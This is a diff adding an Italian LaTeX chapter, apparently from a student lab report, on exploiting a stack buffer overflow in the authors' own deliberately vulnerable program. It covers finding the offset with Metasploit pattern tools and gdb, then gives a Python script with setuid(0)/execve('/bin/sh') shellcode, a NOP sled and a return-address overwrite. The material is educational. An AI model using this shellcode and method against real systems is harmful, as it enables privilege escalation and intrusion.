@@ -1,0 +1,129 @@
+\documentclass[main.tex]{subfiles}
+\begin{document}
+\section{Creazione dell'exploit}\label{sec:cap 3}
+
+Una volta disattivate le principali misure di sicurezza e compilato il programma vulnerabile, è possibile procedere alla costruzione di un exploit, cioè di un input appositamente creato per sfruttare il buffer overflow e alterare il normale flusso di esecuzione del programma.
+
+\noindent L’obiettivo è sovrascrivere il return address salvato nello stack con un valore controllato, in modo da far eseguire codice arbitrario (la shell) al termine della funzione vulnerable().
+
+\noindent Per farlo, è necessario:
+
+\begin{itemize}
+    \item Riempire il buffer fino al return address,
+    \item Sovrascrivere il return address con l’indirizzo di una \textbf{shellcode},
+    \item Posizionare la shellcode in una zona accessibile ed eseguibile, come lo stesso buffer.
+\end{itemize}
+
+\subsubsection*{Calcolare l'offset:}
+
+\noindent Il primo passo fondamentale è individuare con precisione l’\textbf{offset}, ovvero la distanza (in byte) tra l’inizio del buffer vulnerabile e la posizione in memoria in cui viene sovrascritto il \textbf{return address} (registro EIP). Questo valore è essenziale per posizionare correttamente il payload all’interno dell’input.
+
+
+\noindent Abbiamo utilizzato un pattern di input univoco e non ripetitivo, generato con lo script \verb|pattern_create.rb| incluso nel framework Metasploit (presente di default in Kali Linux). Questo pattern consente di identificare esattamente quale parte della stringa va a sovrascrivere il registro EIP al momento del crash.\\
+
+\noindent
+\texttt{/usr/share/metasploit-framework/tools/exploit/pattern\_create.rb -l 150 > pattern.txt}\\
+
+\noindent Successivamente, si avvia il debugger gdb con il comando da terminale \texttt{gdb ./vuln}, all'interno di gdb si digita \texttt{run < pattern.txt} mandando il programma in crash; 
+successivamente con il comando \texttt{info registers eip } ci verrà restituito un output del tipo: \texttt{eip            0x64413764          0x64413764
+}.\\
+
+\noindent
+Questo valore viene inserito poi  nel tool \verb|pattern_offset.rb| per risalire all’offset preciso con il comando: \\
+\texttt{/usr/share/metasploit-framework/tools/exploit/pattern\_offset.rb -q 64413764
+}\\
+\noindent 
+Il risultato sarà un output simile a:
+\texttt{Exact match at offset 112}
+
+\newpage
+
+\noindent
+\textbf{Trovare l'indirizzo del buffer:}\\
+
+\noindent
+L’indirizzo di memoria del buffer è il punto in cui andremo a posizionare la shellcode. Per individuarlo, impostiamo un breakpoint nella funzione \verb|vulnerable| del nostro codice sorgente \verb|.c| usando GDB.\\
+Da terminale digitiamo \texttt{gdb ./vuln} e all'interno di gdb digitiamo prima \texttt{break vulnerable} e successivamente \texttt{run}, quando il programma si ferma al break event point, digitiamo  \texttt{print \&buffer}, ottenendo un otuput del tipo: \\
+
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=1\textwidth]{figures/bufferAdd.png}
+    \caption{Terminale di gdb con la stampa del buffer address.}
+    \label{fig:esempio}
+\end{figure}
+
+\noindent
+Il valore \verb|0xbfffef3c| è l’indirizzo del buffer, che useremo per costruire l’exploit.\\
+
+
+\noindent
+\textbf{Creazione dell'exploit in python:}\\
+
+\noindent
+Una volta calcolati l’offset e l’indirizzo del buffer, è possibile procedere alla creazione dell’exploit vero e proprio. L’exploit consiste in un \textit{payload} binario composto da tre elementi fondamentali: una shellcode che rappresenta il codice malevolo da eseguire, un \textit{padding} (riempimento) per raggiungere il return address, e infine il valore con cui sovrascrivere il return address, che deve puntare alla shellcode o a una zona vicina come il NOP sled.\\
+Nel nostro caso, l’exploit è stato costruito in Python, utilizzando la libreria \verb|struct| per generare correttamente l’indirizzo in formato little-endian.\\
+\newpage
+
+\begin{lstlisting}[style=mypython]
+import struct
+
+buffer_addr = 0xbfffef3c    # indirizzo del buffer address
+offset = 112                # offset calcolato precedentemente
+
+shellcode = (
+    b"\x90" * 39 +               # NOP sled
+    # setuid(0)
+    b"\x31\xc0"                  # xor eax,eax
+    b"\x31\xdb"                  # xor ebx,ebx
+    b"\xb0\x17"                  # mov al,0x17 (syscall setuid)
+    b"\xcd\x80"                  # int 0x80
+    # execve("/bin//sh")
+    b"\x50"                      # push eax (0 terminator)
+    b"\x68\x2f\x2f\x73\x68"      # push "//sh"
+    b"\x68\x2f\x62\x69\x6e"      # push "/bin"
+    b"\x89\xe3"                  # mov ebx,esp
+    b"\x50"                      # push eax
+    b"\x53"                      # push ebx
+    b"\x89\xe1"                  # mov ecx,esp
+    b"\xb0\x0b"                  # mov al,0xb (execve syscall)
+    b"\xcd\x80"                  # int 0x80
+)
+
+# Questo crea una sequenza di caratteri "A" lunga   
+# quanto basta per riempire il buffer fino al return address.
+padding = b"A" * (offset - len(shellcode))
+
+# converte l'indirizzo di ritorno in formato little-indian
+ret = struct.pack("<I", 0xbfffef8c) 
+
+# Costruiamo il payload completo e scriviamo il file paylaod.bin
+payload = shellcode + padding + ret * 4
+with open("payload.bin", "wb") as f:
+    f.write(payload)
+
+print(f"Payload creato, lunghezza: {len(payload)}")
+print(f"Return address usato: {hex(buffer_addr + 20)}")
+print("Lunghezza shellcode:", len(shellcode))
+print("Lunghezza padding:", len(padding))
+print("Totale prima del ret:", len(shellcode) + len(padding))
+print("Offset:", offset)
+
+\end{lstlisting}
+
+\noindent L’exploit consiste in un file in python ( exploit.py) che genera un \textit{payload} binario composto da tre elementi fondamentali: una shellcode che rappresenta il codice malevolo da eseguire, un \textit{padding} (riempimento) per raggiungere il return address, e infine il valore con cui sovrascrivere il return address, che deve puntare alla shellcode o a una zona vicina come il NOP sled (una sequenza di istruzioni NOP destinata a "scorrere" il flusso di esecuzione delle istruzioni della CPU).\\
+
+\noindent Successivamente compiliamo il file exploit.py con il comando da terminale \texttt{python3 exploit.py} avendo come output: 
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.5\textwidth]{figures/compExploit.png}
+    \caption{Output della compilazione del file exploit.py da terminale}
+    \label{fig:esempio}
+\end{figure}
+
+
+
+
+
+\end{document}
